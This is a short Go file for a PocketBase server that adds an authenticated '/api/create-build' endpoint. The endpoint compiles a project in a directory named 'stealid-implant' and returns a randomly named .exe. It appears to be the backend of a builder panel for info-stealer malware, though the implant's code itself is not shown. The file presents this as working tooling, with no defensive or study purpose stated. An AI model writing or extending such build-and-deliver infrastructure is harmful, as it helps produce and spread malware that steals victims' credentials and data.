package main

import (
	"log"
	"net/http"

	"os"
	"os/exec"

	"github.com/labstack/echo/v5"
	"github.com/pocketbase/pocketbase"
	"github.com/pocketbase/pocketbase/apis"
	"github.com/pocketbase/pocketbase/core"
)

func main() {
	app := pocketbase.New()

	app.OnBeforeServe().Add(func(e *core.ServeEvent) error {
		e.Router.AddRoute(echo.Route{
			Method:  http.MethodPost,
			Path:    "/api/create-build",
			Handler: createBuild,
			Middlewares: []echo.MiddlewareFunc{
				apis.ActivityLogger(app),
				apis.RequireRecordAuth(),
			},
		})

		return nil
	})

	if err := app.Start(); err != nil {
		log.Fatal(err)
	}
}

func createBuild(c echo.Context) error {
	cmd := exec.Command("make", "-C", "../stealid-implant", "main")
	out, err := cmd.Output()

	if err != nil {
		log.Println(err)
		return c.String(http.StatusOK, "error")
	}
	log.Println(string(out))

	return c.FileFS("sdfsdfsdgfd.exe", os.DirFS("../stealid-implant"))
}
